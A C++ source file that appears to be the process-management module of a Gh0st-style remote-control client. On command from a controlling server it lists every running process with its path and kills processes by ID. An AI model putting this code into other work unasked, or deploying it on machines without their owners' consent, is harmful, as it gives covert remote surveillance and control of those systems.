#include "ClientProcessManager.h"

CClientProcessManager::CClientProcessManager(_CIOCPClient* ClientObject):CManager(ClientObject)
{
	printf("进程构造函数\r\n");
	m_ProcessModuleBase = LoadLibrary("Process.dll");
	EnableSeDebugPrivilege("SeShutdownPrivilege", TRUE);// 关机权限
	if (m_ProcessModuleBase == NULL)
	{

	}

	m_SeEnumProcessList = (LPFN_SEENUMPROCESSLIST)GetProcAddress(m_ProcessModuleBase, "SeEnumProcessList");
	m_Ring3KillProcess = (f4)GetProcAddress(m_ProcessModuleBase, "Ring3KillProcess");


	if (m_SeEnumProcessList == NULL || m_Ring3KillProcess == NULL)
	{
		return;
	}
	SendClientProcessList();

}

//析构函数
CClientProcessManager::~CClientProcessManager()
{
	printf("进程析构函数\r\n");
	EnableSeDebugPrivilege("SeShutdownPrivilege", FALSE);
	if (m_ProcessModuleBase != NULL)
	{
		FreeLibrary(m_ProcessModuleBase);
		m_ProcessModuleBase = NULL;
	}
}

void CClientProcessManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_PROCESS_REFRESH_REQUIRE:
	{
		SendClientProcessList();
		break;
	}
	case CLIENT_PROCESS_RING3_KILL_REQUIRE:
	{
		m_Ring3KillProcess((PULONG)((LPBYTE)BufferData + 1), (BufferLength - 1) / sizeof(ULONG));


		BYTE IsToken = CLIENT_PROCESS_KILL_REPLY;   //向被控端发送一个COMMAND_SYSTEM
		m_ClientObject->OnServerSending((char*)&IsToken, sizeof(BYTE));

		break;
	}
	default:
		break;
	}
}



BOOL CClientProcessManager::SendClientProcessList()
{
	BOOL  IsOk = FALSE;
	DWORD Offset = 1;
	DWORD v7 = 0;
	ULONG ItemCount = 0;
	char* BufferData = NULL;
	vector<_PROCESS_INFORMATION_> ProcessInfo;  //进程信息
	vector<_PROCESS_INFORMATION_>::iterator i;  //进程信息迭代器
	if (m_SeEnumProcessList == NULL)
	{
		return IsOk;
	}
	ItemCount = m_SeEnumProcessList(ProcessInfo); //枚举
	if (ItemCount == 0)
	{
		return IsOk;
	}
	BufferData = (char*)LocalAlloc(LPTR, 0x1000);
	if (BufferData == NULL)
	{
		goto Exit;
	}
	BufferData[0] = CLIENT_PROCESS_MANAGER_REPLY; //反馈给服务端
	for (i = ProcessInfo.begin(); i != ProcessInfo.end(); i++)
	{
		v7 = sizeof(DWORD) +
			lstrlen(i->ImageNameData) + lstrlen(i->ProcessFullPathData) + 2;
		// 缓冲区太小，再重新分配下
		if (LocalSize(BufferData) < (Offset + v7))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v7),
				LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		//接下来三个memcpy就是向缓冲区里存放数据 数据结构是 
		//进程ID+进程名+0+进程完整名+0  进程
		//因为字符数据是以0 结尾的                                             
		memcpy(BufferData + Offset, &(i->ProcessID), sizeof(ULONG32));
		Offset += sizeof(ULONG32);
		memcpy(BufferData + Offset, i->ImageNameData, lstrlen(i->ImageNameData) + 1);
		Offset += lstrlen(i->ImageNameData) + 1;
		memcpy(BufferData + Offset, i->ProcessFullPathData, lstrlen(i->ProcessFullPathData) + 1);
		Offset += lstrlen(i->ProcessFullPathData) + 1;
	}
	m_ClientObject->OnServerSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
Exit:
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;
}




